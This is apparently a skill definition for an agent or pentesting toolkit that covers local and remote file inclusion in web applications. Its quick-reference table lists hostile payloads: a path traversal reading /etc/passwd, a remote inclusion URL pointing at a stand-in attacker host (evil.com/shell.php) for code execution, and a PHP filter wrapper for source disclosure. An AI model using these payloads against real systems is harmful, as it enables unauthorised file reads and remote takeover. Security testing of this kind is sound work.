---
name: file-attacks
description: Skills for file-based web attacks including local and remote file inclusion.
compatibility: Requires Burp Suite
allowed-tools: burpsuite curl lfimap
metadata:
  category: web
---

# File-Based Attacks

Exploiting file handling vulnerabilities in web applications.

## Skills

- [File Inclusion](references/file-inclusion.md) - LFI/RFI exploitation

## Quick Reference

| Type | Payload | Impact |
|------|---------|--------|
| LFI | `../../../etc/passwd` | File read |
| RFI | `http://evil.com/shell.php` | RCE |
| PHP Wrapper | `php://filter/convert.base64-encode` | Source disclosure |
